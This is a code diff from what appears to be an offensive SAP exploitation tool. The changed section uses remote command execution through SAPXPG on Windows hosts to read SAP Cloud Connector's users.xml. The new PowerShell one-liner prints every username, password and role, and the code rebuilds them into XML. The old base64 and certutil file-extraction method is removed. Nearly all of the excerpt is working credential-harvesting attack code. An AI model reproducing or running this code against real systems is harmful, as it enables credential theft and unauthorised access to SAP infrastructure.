@@ -1928,53 +1928,49 @@ def create_app(api: SAPMAPApi) -> Bottle:
                         print(f"[-] SCC {host}: users.xml not found via "
                               f"{n.sid} on Windows")
                         continue
-                    # Use PowerShell to base64-encode the file with short
-                    # line width (60 chars) so every line stays under
-                    # SAPXPG's 128-byte output limit.
+                    # SAPXPG has a ~128-byte per-line output limit AND a
+                    # PARAMS length limit.  Long PowerShell commands get
+                    # truncated before they run; raw XML has long lines that
+                    # get cut off.
+                    #
+                    # Fix: use PowerShell to parse the XML and emit one short
+                    # pipe-delimited line per user (always < 128 bytes).
+                    # Then reconstruct XML-like objects on the Python side.
+                    #
+                    # Command kept short enough to fit in SAPXPG PARAMS:
                     ps_cmd = (
-                        f"[Convert]::ToBase64String("
-                        f"[IO.File]::ReadAllBytes('{fpath}'),"
-                        f"'InsertLineBreaks')"
-                        f" -replace '(.{{60}})','$1`n'"
+                        f"[xml]$x=[IO.File]::ReadAllText('{fpath}');"
+                        f"$x.SelectNodes('//user')|%"
+                        f"{{Write-Output \"$($_.username)|$($_.password)|$($_.roles)\"}}"
                     )
-                    # PowerShell -Command via cmd /c
                     ps_out, ps_ok = _gw(
-                        "cmd.exe",
-                        f"/c powershell -NoProfile -NonInteractive "
-                        f"-Command \"{ps_cmd}\"")
-                    print(f"[*] SCC {host}: powershell b64 → "
-                          f"{len(ps_out)}B ok={ps_ok}")
-                    import base64 as _b64e
+                        "powershell.exe",
+                        f"-NoProfile -NonInteractive -Command \"{ps_cmd}\"")
+                    print(f"[*] SCC {host}: powershell parse → "
+                          f"{len(ps_out)}B ok={ps_ok} out={ps_out[:80]!r}")
                     raw = None
-                    if ps_out and ps_out.strip():
-                        b64 = ps_out.replace("\n","").replace("\r","").strip()
-                        # Strip any leading/trailing non-base64
-                        import re as _re2
-                        b64 = "".join(_re2.findall(r'[A-Za-z0-9+/=]+', b64))
-                        try:
-                            raw = _b64e.b64decode(b64)
-                            print(f"[*] SCC {host}: decoded {len(raw)}B")
-                        except Exception as e:
-                            print(f"[-] SCC {host}: b64 decode error: {e}")
-                    if raw is None:
-                        # Fallback: chunked certutil — write to temp, read
-                        # in 70-char lines, reassemble
-                        tmp = r"C:\Windows\Temp\.scc_u.b64"
-                        _gw("cmd.exe",
-                            f"/c certutil -encode \"{fpath}\" \"{tmp}\" 2>nul")
-                        # Read temp file line by line via more (each line ≤76B)
-                        tmp_out, _ = _gw("cmd.exe", f"/c more \"{tmp}\"")
-                        _gw("cmd.exe", f"/c del /q \"{tmp}\" 2>nul")
-                        if tmp_out:
-                            b64 = "".join(_re2.findall(
-                                r'[A-Za-z0-9+/=]+', tmp_out))
-                            try:
-                                raw = _b64e.b64decode(b64)
-                                print(f"[*] SCC {host}: certutil fallback "
-                                      f"decoded {len(raw)}B")
-                            except Exception as e:
-                                print(f"[-] SCC {host}: certutil fallback "
-                                      f"decode error: {e}")
+                    if ps_out and "|" in ps_out:
+                        # Reconstruct minimal XML from pipe-delimited records
+                        lines = [l.strip() for l in ps_out.splitlines()
+                                 if "|" in l]
+                        xml_parts = [
+                            b'<?xml version="1.0" encoding="utf-8"?>',
+                            b'<tomcat-users>',
+                        ]
+                        for line in lines:
+                            parts = line.split("|")
+                            if len(parts) >= 2:
+                                uname = parts[0].strip()
+                                pwd   = parts[1].strip()
+                                roles = parts[2].strip() if len(parts) > 2 else ""
+                                xml_parts.append(
+                                    f'  <user username="{uname}" '
+                                    f'password="{pwd}" '
+                                    f'roles="{roles}"/>'.encode())
+                        xml_parts.append(b'</tomcat-users>')
+                        raw = b"\n".join(xml_parts)
+                        print(f"[*] SCC {host}: reconstructed XML "
+                              f"{len(raw)}B from {len(lines)} user(s)")
                 else:
                     linux_roots = [
                         "/opt/sap/scc",
